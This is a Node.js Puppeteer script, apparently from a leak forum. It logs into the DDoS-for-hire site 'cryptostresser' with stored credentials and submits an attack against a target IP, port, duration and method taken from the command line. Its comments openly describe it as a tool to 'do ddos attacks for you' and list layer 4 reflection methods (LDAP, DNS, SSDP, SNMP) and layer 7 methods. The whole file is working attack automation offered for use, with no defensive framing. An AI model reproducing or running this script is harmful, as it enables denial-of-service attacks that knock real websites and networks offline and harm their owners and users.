const puppeteer = require('puppeteer');

const url = process.argv[2];

const UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
];

// ON LINUX ENABLE DIRECTORY OF THE CHROMIUM BROWSER AND DISBLE THE HEADLESS MODE

// apt install chromium-browser

// and after change the path of the chromium browser in the puppeteer.launch() function

//this line --> executablePath: "./node_modules/puppeteer/.local-chromium/win64-982053/chrome-win/chrome.exe",

//by this line --> executablePath: "/usr/bin/chromium-browser",


// this script is an example of a stress script on a website

// it will try to connect to the web page, and do ddos ​​attacks for you using the command line arguments

// example : node cryptostresser.js site ip port time method concurent

// example 2: node cryptostresser.js https://cryptostresser.com/login 73.73.73.75 80 120 FREEDNS 1

// all the methods of the cryptostresser freehub are available below in the documentation

// method l7 = [FREESPAM,FREEHTTPS]

// method l4 = [FREELDAP,FREEDNS,FREESSDP,FREESNMP,FREEREFLECT,FREETCP]

// If you need help please contact the script developer: https://twitter.com/CryptoStresser

// this script is simple but can help small stresser to open with freehub based on other stresser 

// some people can tel yhe this is skid system to use other stresser BUT whait 

// MY NAME IS DARLINGSH remember im a fucking RAT and i dont like paid for ddos so thanks for all other stresser 

// xoxo For GenerationLeaks By DarlingSh 1337Systemx86





// si les 8 arguments sont pas fournis, on affiche l'aide et on ferme le programme
if (process.argv.length < 8) {
    console.log("");
    console.log("Usage: node " + process.argv[1] + " <url> <ip> <port> <time> <method> <concurent>");
    console.log("");
    process.exit();
}
(async () => {

    const browser = await puppeteer.launch({

        // on linux set false to true if you dont do that this script will not work
        // the best os is ubuntu 18.04 to make stable the script
        headless: false,
        defaultViewport: null,

        ignoreDefaultArgs: ["--enable-automation"],
      //  executablePath: "./node_modules/puppeteer/.local-chromium/win64-982053/chrome-win/chrome.exe",

        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--use-gl=desktop',
            '--use-gl=egl',
            '--window-size=1920x1080',
            '--enable-automation'
        ]
    });

    const page = await browser.newPage();

    await page.setViewport({ width: 1920, height: 1080});

    await page.setUserAgent(UserAgents[Math.floor(Math.random() * UserAgents.length)]);
    // enable javascript
    await page.setJavaScriptEnabled(true);

    await page.goto(url);

    var config = require('./user-cryptostresser.json');

    // utiliser les user et password stocker dans le fichier user-cryptostresser.json
    await page.type('#username', config.user);

    await page.type('#password', config.password);
    // patienter 10 secondes
    await page.waitForTimeout(3000);

    await page.keyboard.press('Enter');
    // patienter jusqua la fin du chargement de la page
    await page.goto('https://cryptostresser.com/attack?page=1');
    // patienter jusqua la fin du chargement de la page
    await page.waitForTimeout(3000);


    const attack_host = process.argv[3];

    const attack_port = process.argv[4];

    const attack_time = process.argv[5];

    const attack_methods = process.argv[6];

    const simultaneous_attacks = process.argv[7];


    await console.log('Settings Target: ' + attack_host);
    await page.type('#attack_target', attack_host);

    await console.log('Settings Method: ' + attack_methods);
    await page.type('#attack_methods', attack_methods);
    await page.select('#attack_methods', attack_methods)

    // si l'argument 6 et "FREESPAM", ou "FREEHTTPS" on skip le choix du port
    if (attack_methods == "FREESPAM" || attack_methods == "FREEHTTPS")
    {
        await console.log('Settings Port: ' + attack_port);
        await page.type('#attack_port', attack_port);
    }
    else
    {
        await console.log('Settings Port: ' + attack_port);
        await page.evaluate( () => document.getElementById("attack_port").value = "")
        await page.type('#attack_port', attack_port);
    }
    await console.log('Settings Time: ' + attack_time);
    await page.evaluate( () => document.getElementById("attack_time").value = "")
    await page.type('#attack_time', attack_time);

    // LAYER7 METHOD

    // FREESPAM
    // FREEHTTPS

    // LAYER4 METHOD

    // FREELDAP
    // FREEDNS
    // FREESSDP
    // FREESNMP
    // FREEREFLECT
    // FREETCP


    await console.log('Settings Concurent: ' + simultaneous_attacks);
    await page.type('#simultaneous_attacks', simultaneous_attacks);


    await page.waitForTimeout(3000);

    await page.keyboard.press('Enter');

    await console.log('Attack started on ' + attack_host + ' with ' + attack_port + ' with ' + attack_methods + ' method(s) for ' + attack_time + ' seconds');

    await page.waitForTimeout(6000);

    await page.screenshot({path: 'screenshot.png'});

    await browser.close();

})();